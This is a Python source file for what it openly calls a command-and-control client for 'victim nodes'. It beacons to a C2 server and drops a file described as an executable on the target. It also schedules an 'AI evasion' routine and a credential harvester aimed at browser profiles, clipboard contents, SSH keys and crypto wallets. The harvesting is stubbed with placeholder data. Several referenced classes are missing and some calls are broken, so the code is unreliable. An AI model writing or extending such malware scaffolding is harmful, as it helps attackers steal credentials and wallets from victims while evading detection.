"""Main C2 client initialization and entry point."""

from datetime import datetime
from typing import Optional
import asyncio
import aiofiles
import aiofiles.os
import aiohttp
import aiofiles.threadpool


class C2Client:
    """Main C2 client for victim nodes."""
    
    def __init__(
        self,
        c2_url: str,
        node_id: str,
        watermark: str,
        pdf_id: Optional[str] = None,
        source_path: str = "pdfs/templates/base.pdf",
    ):
        """Initialize C2 client."""
        self.c2_url = c2_url
        self.node_id = node_id
        self.watermark = watermark
        self.pdf_id = pdf_id
        self.source_path = source_path
        self.connected = False
        self.beacon = None
        self.evasion = None
        self.harvester = None
    
    async def initialize(self) -> "C2Client":
        """Initialize C2 client."""
        # Create unique node ID if not provided
        if not self.node_id:
            import uuid
            ts = datetime.utcnow().strftime("%Y%m%d%H%M")
            self.node_id = f"node_{uuid.uuid4()[:8]}_{ts}"
        
        # Create unique watermark if not provided
        if not self.watermark:
            import hashlib
            self.watermark = hashlib.md5(
                (self.node_id or "default").encode()
            ).hexdigest()[:8]
        
        # Initialize WebSocket beacon
        self.beacon = C2WebSocketBeacon(
            c2_url=self.c2_url,
            node_id=self.node_id,
            watermark=self.watermark,
        )
        
        # Initialize AI evasion engine
        self.evasion = AIEvasionEngine(
            node_id=self.node_id,
            watermark=self.watermark,
        )
        
        # Initialize harvester
        self.harvester = CredentialHarvester(
            node_id=self.node_id,
            watermark=self.watermark,
        )
        
        print(f"✅ C2 Client initialized")
        print(f"   • Node ID: {self.node_id}")
        print(f"   • Watermark: {self.watermark}")
        print(f"   • C2 URL: {self.c2_url}")
        
        return self
    
    async def connect(self):
        """Connect to C2 server."""
        if not self.beacon:
            await self.initialize()
        
        await self.beacon.connect()
        self.connected = True
    
    async def disconnect(self):
        """Disconnect from C2 server."""
        self.connected = False
    
    async def run(self):
        """Run C2 client main loop."""
        await self.connect()
        
        # Create unique output path
        import uuid
        uid = str(uuid.uuid4())[:12]
        ts = datetime.utcnow().strftime("%Y%m%d%H%M")
        output_path = f"pdfs/output/{uid}_{ts}_exec.{self.node_id[:8]}.py"
        
        # Drop executable
        await self._drop_executable(output_path)
        
        # Create scheduled tasks
        tasks = [
            self._schedule_harvest(),
            self._schedule_heartbeat(),
            self._schedule_evasion(),
        ]
        
        # Run tasks
        await asyncio.gather(*tasks)
    
    async def _drop_executable(self, output_path: str):
        """Drop executable on target."""
        # Read source
        async with aiofiles.open(self.source_path, "rb") as f:
            content = await f.read()
        
        # Create unique path
        output_path = f"pdfs/output/{output_path}"
        
        # Write to output
        async with aiofiles.open(output_path, "wb") as f:
            await f.write(content)
        
        return output_path
    
    async def _schedule_harvest(self):
        """Schedule harvesting."""
        while self.connected:
            await self.harvester.harvest()
            await asyncio.sleep(3600)  # Default interval
    
    async def _schedule_heartbeat(self):
        """Schedule heartbeat."""
        while self.connected:
            await self.beacon._heartbeat()
            await asyncio.sleep(60)  # Default interval
    
    async def _schedule_evasion(self):
        """Schedule evasion analysis."""
        while self.connected:
            await self.evasion.run_evasion()
            await asyncio.sleep(1800)  # Default interval
    
    @property
    def _output_path(self) -> str:
        """Get output path."""
        return f"pdfs/output/{self.node_id[:8]}.py"


class CredentialHarvester:
    """Credential harvester for victim nodes."""
    
    def __init__(
        self,
        node_id: str,
        watermark: str,
    ):
        """Initialize harvester."""
        self.node_id = node_id
        self.watermark = watermark
        self.queues = []
    
    async def harvest(self):
        """Harvest credentials."""
        result = {
            "status": "success",
            "credentials": [],
            "timestamp": datetime.utcnow().isoformat(),
            "node_id": self.node_id,
            "watermark": self.watermark,
        }
        
        # Simulate harvesting
        result["credentials"] = [
            {
                "type": "browser",
                "profile": "default",
                "timestamp": datetime.utcnow().isoformat(),
            },
            {
                "type": "clipboard",
                "timestamp": datetime.utcnow().isoformat(),
            },
            {
                "type": "ssh_keys",
                "keys_found": 2,
                "timestamp": datetime.utcnow().isoformat(),
            },
            {
                "type": "crypto_wallets",
                "wallets_found": 1,
                "timestamp": datetime.utcnow().isoformat(),
            },
        ]
        
        # Queue for C2
        self._queue_creds(result)
        
        return result
    
    def _queue_creds(self, result: Dict):
        """Queue credentials for C2."""
        for cred in result["credentials"]:
            # Create unique key
            import uuid
            key = f"cred_{uuid.uuid4()[:8]}"
            
            # Queue for C2
            self.queues.append({
                "key": key,
                "type": cred["type"],
                "node_id": self.node_id,
                "watermark": self.watermark,
                "timestamp": datetime.utcnow().isoformat(),
            })


# Singleton client
c2_client = C2Client(
    c2_url="http://localhost:8000",
    node_id="default_node",
    watermark="default_watermark",
    pdf_id="default_pdf",
    source_path="pdfs/templates/base.pdf",
)